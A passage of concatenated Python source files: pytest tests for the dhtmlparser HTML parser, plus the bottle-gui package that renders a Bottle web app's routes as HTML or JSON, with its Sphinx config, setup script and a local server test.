        dhtmlparser.HTMLElement("<xx>"),
        dhtmlparser.HTMLElement("<xx>"),
        dhtmlparser.HTMLElement("</h1>"),
    ]

    dom = dhtmlparser._parseDOM(tag_list)

    assert len(dom) == 2
    assert len(first(dom).childs) == 2
    assert first(dom).childs[0].getTagName() == "xx"
    assert first(dom).childs[1].getTagName() == "xx"
    assert first(dom).childs[0].isNonPairTag()
    assert first(dom).childs[1].isNonPairTag()

    assert not dom[0].isNonPairTag()
    assert not dom[1].isNonPairTag()

    assert dom[0].isOpeningTag()
    assert dom[1].isEndTag()

    assert dom[0].endtag == dom[1]
    assert dom[1].openertag == dom[0]

    assert dom[1].isEndTagTo(dom[0])


def test_parseString():
    dom = dhtmlparser.parseString(
        """<html><tag PARAM="true"></html>"""
    )

    assert dom.childs
    assert len(dom.childs) == 2

    assert dom.childs[0].getTagName() == "html"
    assert dom.childs[1].getTagName() == "html"

    assert dom.childs[0].isOpeningTag()
    assert dom.childs[1].isEndTag()

    assert dom.childs[0].childs
    assert not dom.childs[1].childs

    assert dom.childs[0].childs[0].getTagName() == "tag"
    assert dom.childs[0].childs[0].params
    assert not dom.childs[0].childs[0].childs

    assert "param" in dom.childs[0].childs[0].params
    assert dom.childs[0].childs[0].params["param"] == "true"


def test_parseString_cip():
    dom = dhtmlparser.parseString(
        """<html><tag PARAM="true"></html>""",
        cip=False
    )

    assert dom.childs
    assert len(dom.childs) == 2

    assert dom.childs[0].getTagName() == "html"
    assert dom.childs[1].getTagName() == "html"

    assert dom.childs[0].isOpeningTag()
    assert dom.childs[1].isEndTag()

    assert dom.childs[0].childs
    assert not dom.childs[1].childs

    assert dom.childs[0].childs[0].getTagName() == "tag"
    assert dom.childs[0].childs[0].params
    assert not dom.childs[0].childs[0].childs

    assert "param" not in dom.childs[0].childs[0].params
    assert "PARAM" in dom.childs[0].childs[0].params

    assert dom.childs[0].childs[0].params["PARAM"] == "true"

    with pytest.raises(KeyError):
        dom.childs[0].childs[0].params["param"]


def test_makeDoubleLinked():
    dom = dhtmlparser.parseString(
        """<html><tag PARAM="true"></html>"""
    )

    dhtmlparser.makeDoubleLinked(dom)

    assert dom.childs[0].parent == dom
    assert dom.childs[1].parent == dom

    assert dom.childs[0].childs[0].parent == dom.childs[0]


def test_remove_tags():
    dom = dhtmlparser.parseString("a<b>xax<i>xe</i>xi</b>d")
    assert dhtmlparser.removeTags(dom) == "axaxxexid"

    dom = dhtmlparser.parseString("<b></b>")
    assert not dhtmlparser.removeTags(dom)

    dom = dhtmlparser.parseString("<b><i></b>")
    assert not dhtmlparser.removeTags(dom)

    dom = dhtmlparser.parseString("<b><!-- asd --><i></b>")
    assert not dhtmlparser.removeTags(dom)


def test_remove_tags_str_input():
    inp = "a<b>xax<i>xe</i>xi</b>d"

    assert dhtmlparser.removeTags(inp) == "axaxxexid"


def test_recovery_after_invalid_tag():
    inp = """<sometag />
<invalid tag=something">notice that quote is not properly started</invalid>
<something_parsable />
"""

    dom = dhtmlparser.parseString(inp)

    assert dom.find("sometag")
    assert not dom.find("invalid")
    assert dom.find("something_parsable")


def test_multiline_attribute():
    inp = """<sometag />
<ubertag attribute="long attribute
                    continues here">
    <valid>notice that quote is not properly started</valid>
</ubertag>
<something_parsable />
"""

    dom = dhtmlparser.parseString(inp)

    assert dom.find("sometag")
    assert dom.find("valid")
    assert dom.find("ubertag")
    assert first(dom.find("ubertag")).params["attribute"] == """long attribute
                    continues here"""
    assert dom.find("something_parsable")


def test_recovery_after_unclosed_tag():
    inp = """<code>Já vím... je to příliž krátké a chybí diakritika - je to můj první článek kterej jsem kdy o Linux psal.</code
<!-- -->

    <div class="rating">here is the rating</div>
    """

    dom = dhtmlparser.parseString(inp)

    assert dom.find("div", {"class": "rating"})


def test_recovery_after_is_smaller_than_sign():
    inp = """<code>5 < 10.</code>
    <div class="rating">here is the rating</div>
    """

    dom = dhtmlparser.parseString(inp)

    code = dom.find("code")

    assert code
    assert first(code).getContent() == "5 < 10."
    assert dom.find("div", {"class": "rating"})


def test_equality_of_output_with_comment():
    inp = """<head>
    <!-- <link rel="stylesheet" type="text/css" href="style.css"> -->
</head>
"""
    dom = dhtmlparser.parseString(inp)

    assert dom.__str__() == inp
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from dhtmlparser.quoter import escape, unescape


# Functions & objects =========================================================
def test_unescape():
    assert unescape(r"""\' \\ \" \n""") == r"""\' \\ " \n"""
    assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
    assert unescape(r"""\' \\" \n""") == r"""\' \\" \n"""
    assert unescape(r"""\' \\" \n""") == r"""\' \\" \n"""
    assert unescape(r'printf(\"hello \t world\");') == \
           r'printf("hello \t world");'

def test_escape():
    assert escape(r"'", "'") == r"""\'"""
    assert escape(r"\\", "'") == "\\\\"
    assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser
from dhtmlparser import first


# Functions & objects =========================================================
def test_find():
    dom = dhtmlparser.parseString(
        """
        "<div ID='xa' a='b'>obsah xa divu</div> <!-- ID, not id :) -->
         <div id='xex' a='b'>obsah xex divu</div>
        """
    )

    div_xe = dom.find("div", {"id": "xa"})  # notice the small `id`
    div_xex = dom.find("div", {"id": "xex"})
    div_xerexes = dom.find("div", {"id": "xerexex"})

    assert div_xe
    assert div_xex
    assert not div_xerexes

    div_xe = first(div_xe)
    div_xex = first(div_xex)

    assert div_xe.toString() == '<div ID="xa" a="b">obsah xa divu</div>'
    assert div_xex.toString() == '<div id="xex" a="b">obsah xex divu</div>'

    assert div_xe.getTagName() == "div"
    assert div_xex.getTagName() == "div"


def test_find_fn():
    dom = dhtmlparser.parseString(
        """
        <div id=first>
            First div.
            <div id=first.subdiv>
                Subdiv in first div.
            </div>
        </div>
        <div id=second>
            Second.
        </div>
        """
    )

    div_tags = dom.find("div", fn=lambda x: x.params.get("id") == "first")

    assert div_tags
    assert len(div_tags) == 1

    assert first(div_tags).params.get("id") == "first"
    assert first(div_tags).getContent().strip().startswith("First div.")


def test_find_params():
    dom = dhtmlparser.parseString(
        """
        <div id=first>
            First div.
            <div id=first.subdiv>
                Subdiv in first div.
            </div>
        </div>
        <div id=second>
            Second.
        </div>
        """
    )

    div_tags = dom.find("", {"id": "first"})

    assert div_tags
    assert len(div_tags) == 1

    assert first(div_tags).params.get("id") == "first"
    assert first(div_tags).getContent().strip().startswith("First div.")


def test_findB():
    dom = dhtmlparser.parseString(
        """
        <div id=first>
            First div.
            <div id=first.subdiv>
                Subdiv in first div.
            </div>
        </div>
        <div id=second>
            Second.
        </div>
        """
    )

    assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
    assert dom.findB("div")[1].getContent().strip() == "Second."


def test_wfind():
    dom = dhtmlparser.parseString(
        """
        <div id=first>
            First div.
            <div id=first.subdiv>
                Subdiv in first div.
            </div>
        </div>
        <div id=second>
            Second.
        </div>
        """
    )

    div = dom.wfind("div").wfind("div")

    assert div.childs
    assert first(div.childs).params["id"] == "first.subdiv"


def test_wfind_complicated():
    dom = dhtmlparser.parseString(
        """
        <root>
            <some>
                <something>
                    <xe id="wanted xe" />
                </something>
                <something>
                    asd
                </something>
                <xe id="another xe" />
            </some>
            <some>
                else
                <xe id="yet another xe" />
            </some>
        </root>
        """
    )

    xe = dom.wfind("root").wfind("some").wfind("something").find("xe")

    assert len(xe) == 1
    assert first(xe).params["id"] == "wanted xe"

    unicorn = dom.wfind("root").wfind("pink").wfind("unicorn")

    assert not unicorn.childs


def test_wfind_multiple_matches():
    dom = dhtmlparser.parseString(
        """
        <root>
            <some>
                <something>
                    <xe id="wanted xe" />
                </something>
                <something>
                    <xe id="another wanted xe" />
                </something>
                <xe id="another xe" />
            </some>
            <some>
                <something>
                    <xe id="last wanted xe" />
                </something>
            </some>
        </root>
        """
    )

    xe = dom.wfind("root").wfind("some").wfind("something").wfind("xe")

    assert len(xe.childs) == 3
    assert xe.childs[0].params["id"] == "wanted xe"
    assert xe.childs[1].params["id"] == "another wanted xe"
    assert xe.childs[2].params["id"] == "last wanted xe"


def test_match():
    dom = dhtmlparser.parseString(
        """
        <root>
            <some>
                <something>
                    <xe id="wanted xe" />
                </something>
                <something>
                    <xe id="another wanted xe" />
                </something>
                <xe id="another xe" />
            </some>
            <some>
                <something>
                    <xe id="last wanted xe" />
                </something>
            </some>
        </root>
        """
    )

    xe = dom.match("root", "some", "something", "xe")
    assert len(xe) == 3
    assert xe[0].params["id"] == "wanted xe"
    assert xe[1].params["id"] == "another wanted xe"
    assert xe[2].params["id"] == "last wanted xe"

def test_match_parameters():
    dom = dhtmlparser.parseString(
        """
        <root>
            <div id="1">
                <div id="5">
                    <xe id="wanted xe" />
                </div>
                <div id="10">
                    <xe id="another wanted xe" />
                </div>
                <xe id="another xe" />
            </div>
            <div id="2">
                <div id="20">
                    <xe id="last wanted xe" />
                </div>
            </div>
        </root>
        """
    )

    xe = dom.match(
        "root",
        {"tag_name": "div", "params": {"id": "1"}},
        ["div", {"id": "5"}],
        "xe"
    )

    assert len(xe) == 1
    assert first(xe).params["id"] == "wanted xe"


def test_match_parameters_relative_path():
    dom = dhtmlparser.parseString(
        """
        <root>
            <div id="1">
                <div id="5">
                    <xe id="wanted xe" />
                </div>
                <div id="10">
                    <xe id="another wanted xe" />
                </div>
                <xe id="another xe" />
            </div>
            <div id="2">
                <div id="20">
                    <xe id="last wanted xe" />
                </div>
            </div>
        </root>
        """
    )

    xe = dom.match(
        {"tag_name": "div", "params": {"id": "1"}},
        ["div", {"id": "5"}],
        "xe",
    )

    assert len(xe) == 1
    assert first(xe).params["id"] == "wanted xe"

    xe = dom.match(
        {"tag_name": "div", "params": {"id": "1"}},
        ["div", {"id": "5"}],
        "xe",
        absolute=True
    )

    assert not xe
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from dhtmlparser import HTMLElement


# Functions & objects =========================================================
def test_costructuro_parameters():
    e = HTMLElement("name", {"key": "value"})

    assert e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString()
    assert not e.getContent()
    assert e.tagToString()
    assert e.getTagName() == "name"

    assert "key" in e.params
    assert e.params["key"] == "value"

    assert dict(e.params) == {"key": "value"}


def test_costructor_with_childs():
    e = HTMLElement(
        "name",
        {"key": "value"},
        [
            HTMLElement("hello"),
            HTMLElement("<hi />")
        ]
    )

    assert e.isTag()
    assert not e.isEndTag()
    assert e.isOpeningTag()
    assert e.isPairTag()
    assert not e.isComment()
    assert not e.isNonPairTag()

    assert e.childs
    assert e.params
    assert e.endtag
    assert not e.openertag

    assert e.toString()
    assert e.getContent() == "hello<hi />"
    assert e.tagToString()
    assert e.getTagName() == "name"

    assert "key" in e.params
    assert e.params["key"] == "value"

    assert dict(e.params) == {"key": "value"}

    assert len(e.childs) == 2

    assert e.childs[0].getContent() == "hello"
    assert e.childs[1].getTagName() == "hi"


def test_costructor_with_chids_no_param():
    e = HTMLElement(
        "name",
        [
            HTMLElement("hello"),
            HTMLElement("<hi />")
        ]
    )

    assert e.isTag()
    assert not e.isEndTag()
    assert e.isOpeningTag()
    assert e.isPairTag()
    assert not e.isComment()
    assert not e.isNonPairTag()

    assert e.childs
    assert not e.params
    assert e.endtag
    assert not e.openertag

    assert e.toString()
    assert e.getContent() == "hello<hi />"
    assert e.tagToString()
    assert e.getTagName() == "name"

    assert len(e.childs) == 2

    assert e.childs[0].getContent() == "hello"
    assert e.childs[1].getTagName() == "hi"

def test_costructor_with_childs_only():
    e = HTMLElement(
        [
            HTMLElement("hello"),
            HTMLElement("<hi>"),
        ]
    )

    assert not e.isTag()
    assert not e.isEndTag()
    assert not e.isOpeningTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert not e.isNonPairTag()

    assert e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == "hello<hi></hi>"
    assert e.getContent() == "hello<hi></hi>"
    assert not e.tagToString()
    assert not e.getTagName()

    assert len(e.childs) == 3

    assert e.childs[0].getContent() == "hello"
    assert e.childs[1].getTagName() == "hi"
    assert e.childs[2].getTagName() == "hi"  # endtag is automatically created
    assert e.childs[2].isEndTag()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser
from dhtmlparser import first


# Variables ===================================================================
TEXT = "<div><nonpair /></div>"
dom = dhtmlparser.parseString(TEXT)


# Functions & objects =========================================================
def test_replaceWith():
    nonpair = first(dom.find("nonpair"))

    assert nonpair

    nonpair.replaceWith(
        dhtmlparser.HTMLElement("<another />")
    )

    assert dom.find("another")

    assert dom.getContent() == "<div><another /></div>"


def test_removeChild():
    dom.removeChild(
        dom.find("another")
    )

    assert dom.getContent() == "<div></div>"

    dom.removeChild(dom.find("div"), end_tag_too=False)

    assert dom.getContent() == ""
    assert len(dom.childs) == 1  # endtag wasn't removed

    dom2 = dhtmlparser.parseString("<div></div>")
    dom2.removeChild(dom2.find("div"))

    assert dom2.getContent() == ""
    assert not dom2.childs


def test_params():
    dom = dhtmlparser.parseString("<xe id=1 />")
    xe = first(dom.find("xe"))

    assert xe.params["id"] == "1"

    xe.params = {}
    assert str(xe) == "<xe />"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from dhtmlparser import HTMLElement


# Functions & objects =========================================================
def test_constructor_text():
    text = "hello"
    e = HTMLElement(text)

    assert not e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert not e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == text
    assert e.getContent() == text
    assert e.tagToString() == text
    assert e.getTagName() == text


def test_constructor_inline_tag():
    text = "<hello />"
    e = HTMLElement(text)

    assert e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert not e.isOpeningTag()
    assert e.isNonPairTag()

    assert not e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == text
    assert e.getContent() == ""
    assert e.tagToString() == text
    assert e.getTagName() == "hello"


def test_constructor_normal_tag():
    text = "<hello>"
    e = HTMLElement(text)

    assert e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == text
    assert e.getContent() == ""
    assert e.tagToString() == text
    assert e.getTagName() == "hello"


def test_constructor_end_tag():
    text = "</hello>"
    e = HTMLElement(text)

    assert e.isTag()
    assert e.isEndTag()
    assert e.isPairTag()
    assert not e.isComment()
    assert not e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == ""
    assert e.getContent() == ""
    assert e.tagToString() == text
    assert e.getTagName() == "hello"


def test_constructor_param_tag():
    text = """<hello as='bsd' xe=1 xax="xerexe">"""
    e = HTMLElement(text)

    assert e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert not e.isComment()
    assert e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == '<hello as="bsd" xe="1" xax="xerexe">'
    assert e.getContent() == ""
    assert e.getTagName() == "hello"

    assert "as" in e.params
    assert "xe" in e.params
    assert "xax" in e.params

    assert e.params["as"] == "bsd"
    assert e.params["xe"] == "1"
    assert e.params["xax"] == "xerexe"


def test_constructor_comment():
    text = "<!-- asd -->"
    e = HTMLElement(text)

    assert e.isTag()
    assert not e.isEndTag()
    assert not e.isPairTag()
    assert e.isComment()
    assert not e.isOpeningTag()
    assert not e.isNonPairTag()

    assert not e.childs
    assert not e.params
    assert not e.endtag
    assert not e.openertag

    assert e.toString() == text
    assert e.getContent() == ""
    assert e.tagToString() == text
    assert e.getTagName() == text
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from bottle_gui import gui
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json
import inspect
import os.path
from string import Template

import bottle
from bottle import route, static_file, request, response

from napoleon2html import napoleon_to_html


# Variables ===================================================================
TEMPLATE_PATH = "static/templates/"  #: Path to the template directory.


def read_template(template_name):
    """
    Read content of the template file.

    Args:
        template_name (str): Name of the file.

    Returns:
        str: Content of `template_name` from :attr:`TEMPLATE_PATH` directory.
    """
    template_path = os.path.join(
        os.path.dirname(__file__),
        TEMPLATE_PATH,
        template_name
    )

    with open(template_path) as f:
        return f.read()


# load all necessary templates
INDEX_TEMPLATE = read_template("index.html")  #: static/templates/index.html
TABLE_TEMPLATE = read_template("table.html")  #: static/templates/table.html
ROW_TEMPLATE   = read_template("row.html")  #: static/templates/row.html
DESCR_TEMPLATE = read_template("descr.html")  #: static/templates/descr.html
BLACKLIST = ["/", "/bottle_gui_static/"]


# Classes =====================================================================
class RouteInfo(object):
    """
    Container for informations about `route`.

    Attributes:
        method (fn reference): Reference to undecorated function.
        path (str): Path to the function in bottle.
        args (list): Args of the function.
        docstring (str): Docstring for the function.
        mdocstring (str): Docstring for the module where the function is.
        module_name (str): Name of the module where the function is.
    """
    def __init__(self, method, path, args, docstring, mdocstring, module_name):
        """
        Attributes
            method (fn reference): see Attributes section for details.
            path (str): see Attributes section for details.
            args (list): see Attributes section for details.
            docstring (str): see Attributes section for details.
            mdocstring (str): see Attributes section for details.
            module_name (str): see Attributes section for details.
        """
        self.method = method
        self.path = path
        self.args = args
        self.docstring = self._sanitize(docstring)
        self.mdocstring = self._sanitize(mdocstring)
        self.module_name = module_name

    def _sanitize(self, s):
        """
        Replace ``<`` and ``>`` with corresponding HTML entities.

        Args:
            s (str): Input string.

        Returns:
            str: String with entities, or `s` ``if not s``.
        """
        if s:
            return s.replace("<", "&lt;").replace(">", "&gt;")

        return s

    def to_html(self):
        """
        Convert informations about this route to HTML.

        Note:
            :attr:`DESCR_TEMPLATE` and :attr:`ROW_TEMPLATE` is used.

        Returns:
            str: HTML representation of the `route`.
        """
        descr = ""

        # process docstring
        if self.docstring:
            docstring = self.docstring.strip() or ""

            descr = Template(DESCR_TEMPLATE).substitute(
                method_description=napoleon_to_html(docstring)
            )

        # wrap arguments to the html
        args = self.args or ""
        if args:
            args_style = "&#8672; &lt;<span class='param'>"
            args = args_style + "</span>, <span class='param'>".join(args)
            args += "</span>&gt;"

        return Template(ROW_TEMPLATE).substitute(
            name=self.path,
            args=args,
            http_type=self.method,
            method_description=descr
        )

    def to_dict(self):
        """
        Return dictionary representation of the class. This method is used for
        JSON output.

        Returns:
            dict: Dictionary following keys: ``method``, ``path``, ``args``, \
                  ``docstring``, ``mdocstring``, ``module_name``.
        """
        return {
            "method": self.method,
            "path": self.path,
            "args": self.args,
            "docstring": self.docstring,
            "mdocstring": self.mdocstring,
            "module_name": self.module_name,
        }

    def __str__(self):  # TODO: remove
        return self.method + " " + self.path


class RouteGroup(object):
    """
    This object is used to group :class:`RouteInfo` objects.

    Args:
        routes (list, default []): List with :class:`RouteInfo` objects.
    """
    def __init__(self, routes=[]):
        self.routes = routes

    def get_path(self):  # TODO: shortest path
        """
        Return `path` for this group.

        Returns:
            str: Path.
        """
        if len(self.routes) == 1:
            return self.routes[0].path

        # get longest path
        route_paths = map(lambda x: x.path, self.routes)
        longest_path = max(route_paths)

        if longest_path.endswith("/"):
            return longest_path

        return os.path.dirname(longest_path)

    def get_docstring(self):
        """
        Return 'module' docstring.

        Returns:
            str: Module docstring, if defined, or blank string.
        """
        if self.routes:
            return self.routes[0].mdocstring or ""

        return ""

    def to_html(self):
        """
        Convert group and all contained paths to HTML.

        Note:
            :attr:`TABLE_TEMPLATE` is used.

        Returns:
            str: HTML.
        """
        return Template(TABLE_TEMPLATE).substitute(
            name=self.get_path(),
            description=self.get_docstring(),
            rows="\n".join(
                map(
                    lambda x: x.to_html(),
                    sorted(self.routes, key=lambda x: x.path)
                )
            )
        )

    def to_dict(self):
        """
        Convert group to dict. This method is used for JSON output.

        Returns:
            dict: {path: [routes]}

        See Also:
            :meth:`RouteInfo.to_dict`
        """
        return {
            self.get_path(): map(lambda x: x.to_dict(), self.routes)
        }

    def __str__(self):  # TODO: remove
        return "group: " + " ".join(map(lambda x: str(x), self.routes)) + "\n"


# Functions ===================================================================
def list_routes():
    """
    Get list of :class:`RouteInfo` objects from bottle introspection.

    Returns:
        list: :class:`RouteInfo` objects.
    """
    return map(
        lambda r: RouteInfo(
            method=r.method,
            path=r.rule.split("<")[0],
            args=r.get_callback_args(),
            docstring=inspect.getdoc(r.get_undecorated_callback()) or "",
            mdocstring=inspect.getdoc(
                inspect.getmodule(r.get_undecorated_callback())
            ),
            module_name=r.get_undecorated_callback().__module__
        ),
        bottle.default_app().routes
    )


def group_routes(ungrouped_routes):
    """
    Group list of :class:`RouteInfo` objects in `ungrouped_routes` by their
    :attr:`RouteInfo.path` properties.

    Args:
        ungrouped_routes (list): List of :class:`RouteInfo` objects.

    Returns:
        list: :class:`RouteGroup` objects.
    """
    groups = []

    # go from longest routes to shorter
    routes = sorted(
        ungrouped_routes,
        key=lambda x: len(x.path),
        reverse=True
    )

    # group and remove / routes - they would break grouping algorithm later
    root_paths = filter(lambda x: x.path == "/", routes)
    if root_paths:
        groups.append(
            RouteGroup(root_paths)
        )

        # remove / routes if present
        map(lambda x: routes.pop(), root_paths)

    processed = set()
    for route in routes:
        # skip already processed routes
        if route in processed:
            continue

        # find all routes, which starts with `route`
        same_group = filter(
            lambda x: x.path.startswith(route.path),
            routes
        )

        # skip routes without groups for later processing
        if len(same_group) <= 1:  # contains always actual route, so <= 1
            continue

        groups.append(RouteGroup(same_group))
        processed.update(same_group)

    # don't forget to uprocessed routes
    for route in set(routes) - processed:
        groups.append(
            RouteGroup([route])
        )

    return groups


def to_html(grouped_routes):
    """
    Convert list of :class:`RouteGroup` objects in `group_routes` to HTML.

    Args:
        grouped_routes (list): Llist of :class:`RouteGroup` objects.

    Returns:
        str: HTML page with routes.
    """
    return Template(INDEX_TEMPLATE).substitute(
        tables="\n".join(
            map(
                lambda x: x.to_html(),
                sorted(grouped_routes, key=lambda x: x.get_path())
            )
        )
    )


def to_json(grouped_routes):
    """
    Convert list of :class:`RouteGroup` objects in `grouped_routes` to JSON.

    Args:
        grouped_routes (list): Llist of :class:`RouteGroup` objects.

    Returns:
        str: JSON representation of `grouped_routes`.
    """
    routes = map(
        lambda x: x.to_dict(),
        grouped_routes
    )

    return json.dumps(
        routes,
        indent=4,
        separators=(',', ': ')
    )


def gui(path="/"):
    """
    Run `bootle-gui` at given `path`.

    Args:
        path (str, default "/"): Bottle path on which the application will be
             available.

    Returns:
        fn reference: Function, which provides the `bottle-gui` functionality,\
                      mapped to bottle `path`.
    """
    @route(path)
    def root():
        """
        Handle requests to root of the project.
        """
        grouped_routes = group_routes(
            filter(lambda x: x.path not in BLACKLIST, list_routes())
        )

        accept = request.headers.get("Accept", "")
        if "json" in request.content_type.lower() or "json" in accept.lower():
            response.content_type = "application/json; charset=utf-8"
            return to_json(grouped_routes)

        return to_html(grouped_routes)

    return root


@route("/bottle_gui_static/<fn>")
def get_static(fn):
    """
    Serve static files.
    """
    return static_file(
        fn,
        root=os.path.join(os.path.dirname(__file__), 'static/')
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-

def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import urllib

sys.path.append('../src/bottle_gui')

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.coverage',
    'sphinx.ext.viewcode',
    'sphinxcontrib.napoleon',
    'sphinx.ext.intersphinx'
]

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Sorting of items
autodoc_member_order = "bysource"

# Document all methods in classes
autoclass_content = 'both'

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = 'bottle-gui'
copyright = '2015, Bystroushaak'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import getVersion
    release = getVersion(open("../CHANGES.rst").read())
except:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = project
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages

from docs import getVersion


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions & classes =========================================================
setup(
    name='bottle-gui',
    version=getVersion(changelog),
    description="Package used to vizualize services in Bottle web framework.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/bottle-gui',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Framework :: Bottle",
        "Topic :: Internet :: WWW/HTTP :: WSGI",
        "Topic :: Internet :: WWW/HTTP :: WSGI :: Application",
        "Topic :: Software Development :: Libraries",
        "Programming Language :: Python :: 2.7",
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    include_package_data=True,
    zip_safe=False,
    install_requires=[
        "setuptools",
        "bottle",
        "napoleon2html"
    ],
    extras_require={
        "test": [
            "pytest",
            "requests"
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
# Imports ====================================================================
import sys
import time
import random
from multiprocessing import Process

import pytest
import requests
from bottle import run

import services  # local services for test purposes

sys.path.insert(0, 'src')
import bottle_gui


# Variables ==================================================================
ADDR = "127.0.0.1"
PORT = random.randint(10000, 65525)
URL = 'http://%s:%s%s' % (ADDR, PORT, "/")
SERV = None


# Functions & classes ========================================================
def run_server():
    bottle_gui.bottle_gui.BLACKLIST = []
    bg = bottle_gui.gui()
    run(
        host=ADDR,
        port=PORT,
        # server="paste",
        # debug=True,
        # reloader=True,
        # ssl_pem="static/host.pem"
    )


# Setup/Teardown ==============================================================
def setup_module(module):
    """
    Run server as subprocess.

    This is something like module constructor.
    """
    global SERV
    SERV = Process(target=run_server)
    SERV.start()
    time.sleep(1)


def teardown_module(module):
    """
    Shut down server subprocess.

    This is something like module destructor.
    """
    SERV.terminate()

    # test that server was really closed
    with pytest.raises(requests.exceptions.ConnectionError):
        requests.get(URL)


# Tests =======================================================================
def test_html_output():
    res = requests.get(URL)
    assert "<title>API index</title>" in res.text

    assert "Xex module docstring." in res.text
    assert "/sources/xex" in res.text
    assert "Another docstring" in res.text

    assert "Hist module level docstring." in res.text
    assert "/sources/hist" in res.text
    assert "/sources/hist/xe" in res.text
    assert "Here is hist docstring and so on." in res.text
    assert "Here is hist/xe docstring and so on." in res.text


def test_json_output():
    res = requests.get(URL, headers={'Accept': 'text/json'})
    data = res.json()

    root = {
        u'/': [
            {
                u'args': [],
                u'docstring': u'Handle requests to root of the project.',
                u'path': u'/',
                u'mdocstring': None,
                u'module_name': u'bottle_gui.bottle_gui',
                u'method': u'GET'
            }
        ]
    }

    static = {
        u'/bottle_gui_static/': [
            {
                u'args': [u'fn'],
                u'docstring': u'Serve static files.',
                u'path': u'/bottle_gui_static/',
                u'mdocstring': None,
                u'module_name': u'bottle_gui.bottle_gui',
                u'method': u'GET'
            }
        ]
    }

    hist = {
        u'/sources/hist': [
            {
                u'args': [u'something', u'something_else'],
                u'docstring': u'Here is hist/xe docstring and so on.',
                u'path': u'/sources/hist/xe',
                u'mdocstring': u'Hist module level docstring.',
                u'module_name': u'services.hist',
                u'method': u'GET'
            },
            {
                u'args': [u'something', u'something_else'],
                u'docstring': u'Here is hist docstring and so on.',
                u'path': u'/sources/hist',
                u'mdocstring': u'Hist module level docstring.',
                u'module_name': u'services.hist',
                u'method': u'GET'
            }
        ]
    }

    xex = {
        u'/sources/xex': [
            {
                u'args': [u'something', u'something_else'],
                u'docstring': u'Another docstring',
                u'path': u'/sources/xex',
